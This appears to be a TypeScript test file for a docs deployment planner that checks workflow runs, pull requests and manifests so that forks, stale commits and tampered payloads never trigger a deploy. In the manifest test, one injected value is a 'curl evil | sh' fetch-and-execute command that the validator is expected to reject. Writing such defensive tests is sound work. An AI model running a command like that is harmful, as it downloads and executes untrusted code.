import assert from "node:assert/strict";
import { test } from "node:test";
import { checkManifest, pickPr, planFromRun, type PlanInput, type PrInfo, type RunInfo } from "../src/deploy-plan.ts";

const REPO = "PaulSenon/webmcp-sdk";
const SHA = "a".repeat(40);
const NEW = "b".repeat(40);

const run = (over: Partial<RunInfo> = {}): RunInfo => ({
  id: 1,
  event: "pull_request",
  head_sha: SHA,
  head_branch: "feature",
  conclusion: "success",
  path: ".github/workflows/docs.yml",
  head_repository: { full_name: REPO },
  pull_requests: [{ number: 6 }],
  ...over,
});
const pr = (over: Partial<PrInfo> & { headSha?: string; headRepo?: string | null; login?: string } = {}): PrInfo => ({
  number: over.number ?? 6,
  state: over.state ?? "open",
  draft: over.draft ?? false,
  head: { sha: over.headSha ?? SHA, ref: "feature", repo: over.headRepo === null ? null : { full_name: over.headRepo ?? REPO } },
  base: over.base ?? { ref: "main", repo: { full_name: REPO } },
  user: { login: over.login ?? "PaulSenon" },
});
const plan = (over: Partial<PlanInput> = {}) =>
  planFromRun({ run: run(), repo: REPO, pr: pr(), mode: "dynamic", dependabotPreviews: false, mainHead: undefined, ...over });

// --- PR resolution: payload and API lookups are only candidates --------------------------------

test("resolution: a PR counts only if its head is this commit, in this repository, into it", () => {
  assert.equal(pickPr([pr()], run(), REPO)?.number, 6);
  assert.equal(pickPr([pr({ headSha: NEW })], run(), REPO), undefined); // moved on: another run deploys
  assert.equal(pickPr([pr({ headRepo: "attacker/webmcp-sdk" })], run(), REPO), undefined); // fork head
  assert.equal(pickPr([pr({ headRepo: null })], run(), REPO), undefined); // deleted fork
  assert.equal(pickPr([pr({ base: { ref: "main", repo: { full_name: "other/repo" } } })], run(), REPO), undefined);
  assert.equal(pickPr([], run(), REPO), undefined);
});

test("resolution: the same PR from several lookups is fine; two different PRs for one SHA are refused", () => {
  assert.equal(pickPr([pr(), pr(), pr({ number: 9, headSha: NEW })], run(), REPO)?.number, 6);
  assert.throws(() => pickPr([pr(), pr({ number: 9 })], run(), REPO), /several PRs/);
});

// --- plan: the payload is not trusted --------------------------------------------------------------

test("plan: never deploys a fork run, another workflow, or a malformed SHA", () => {
  assert.equal(plan({ run: run({ head_repository: { full_name: "attacker/webmcp-sdk" } }) }).action, "skip");
  assert.equal(plan({ run: run({ head_repository: null }) }).action, "skip");
  assert.equal(plan({ run: run({ path: ".github/workflows/evil.yml" }) }).action, "skip");
  assert.equal(plan({ run: run({ head_sha: "main" }) }).action, "skip");
  assert.equal(plan({ run: run({ event: "pull_request_target" }) }).action, "skip");
});

test("plan: a run whose payload names a PR but no verified PR exists does nothing", () => {
  // pull_requests in the payload says #6, but the API lookup found no PR with this head.
  assert.deepEqual(plan({ pr: undefined }), { action: "skip", reason: "no same-repository PR has this commit as its head" });
});

test("plan: open, ready PR at this commit with a green build deploys; stage is recomputed from the mode", () => {
  assert.deepEqual(plan(), { action: "deploy-preview", pr: 6, stage: "pr-6", reason: "open, ready, head == built commit, build succeeded" });
  assert.equal((plan({ mode: "staging" }) as { stage: string }).stage, "staging");
  assert.equal(plan({ run: run({ conclusion: "failure" }) }).action, "skip");
  assert.equal(plan({ run: run({ conclusion: "cancelled" }) }).action, "skip");
  assert.equal(plan({ pr: pr({ base: { ref: "next", repo: { full_name: REPO } } }) }).action, "skip");
});

// --- races ---------------------------------------------------------------------------------------

test("race: close (merged or not) and convert-to-draft tear down in dynamic mode, whatever the build", () => {
  assert.deepEqual(plan({ pr: pr({ state: "closed" }) }), { action: "teardown-preview", pr: 6, stage: "pr-6", reason: "PR closed" });
  assert.deepEqual(plan({ pr: pr({ draft: true }) }), { action: "teardown-preview", pr: 6, stage: "pr-6", reason: "PR draft" });
  assert.equal(plan({ pr: pr({ state: "closed" }), run: run({ conclusion: "cancelled" }) }).action, "teardown-preview");
  // staging is shared: never torn down
  assert.equal(plan({ pr: pr({ state: "closed" }), mode: "staging" }).action, "skip");
});

test("race: reopen redeploys (state is read now, not from the event)", () => {
  // A run for the `closed` event that is planned after the PR was reopened sees an open PR.
  assert.equal(plan({ pr: pr({ state: "open" }) }).action, "deploy-preview");
});

test("race: a new push makes the older run a no-op", () => {
  // The older run's commit is no longer the head: resolution finds no PR for it.
  assert.equal(plan({ pr: pickPr([pr({ headSha: NEW })], run(), REPO) }).action, "skip");
});

test("Dependabot: build only unless DOCS_PREVIEW_DEPENDABOT=true", () => {
  const bot = pr({ login: "dependabot[bot]" });
  assert.match((plan({ pr: bot }) as { reason: string }).reason, /Dependabot PR: build only/);
  assert.equal(plan({ pr: bot, dependabotPreviews: true }).action, "deploy-preview");
});

test("production: only a green run of main that is still the head of main", () => {
  const push = run({ event: "push", head_branch: "main", pull_requests: [] });
  assert.equal(plan({ run: push, pr: undefined, mainHead: SHA }).action, "deploy-production");
  assert.equal(plan({ run: run({ event: "workflow_dispatch", head_branch: "main" }), pr: undefined, mainHead: SHA }).action, "deploy-production");
  assert.match((plan({ run: push, pr: undefined, mainHead: NEW }) as { reason: string }).reason, /superseded/);
  assert.equal(plan({ run: { ...push, head_branch: "feature" }, pr: undefined, mainHead: SHA }).action, "skip");
  assert.equal(plan({ run: { ...push, conclusion: "failure" }, pr: undefined, mainHead: SHA }).action, "skip");
  assert.equal(plan({ run: { ...push, head_repository: { full_name: "fork/x" } }, pr: undefined, mainHead: SHA }).action, "skip");
});

// --- manifest ------------------------------------------------------------------------------------

test("manifest: must equal the recomputed sha, pr and stage, with no extra keys", () => {
  const good = { sha: SHA, pr: 6, stage: "pr-6", event: "pull_request", action: "synchronize" };
  assert.deepEqual(checkManifest(good, { sha: SHA, pr: 6, stage: "pr-6" }), good);
  assert.throws(() => checkManifest({ ...good, sha: NEW }, { sha: SHA, pr: 6, stage: "pr-6" }), /sha differs/);
  assert.throws(() => checkManifest({ ...good, pr: 7 }, { sha: SHA, pr: 6, stage: "pr-6" }), /pr differs/);
  assert.throws(() => checkManifest({ ...good, stage: "production" }, { sha: SHA, pr: 6, stage: "pr-6" }), /stage differs/);
  assert.throws(() => checkManifest({ ...good, run: "curl evil | sh" }, { sha: SHA, pr: 6, stage: "pr-6" }), /unexpected manifest keys/);
  assert.throws(() => checkManifest("x", { sha: SHA, pr: 6, stage: "pr-6" }), /not an object/);
  const prod = { sha: SHA, pr: null, stage: "production", event: "push", action: null };
  assert.deepEqual(checkManifest(prod, { sha: SHA, pr: null, stage: "production" }), prod);
});
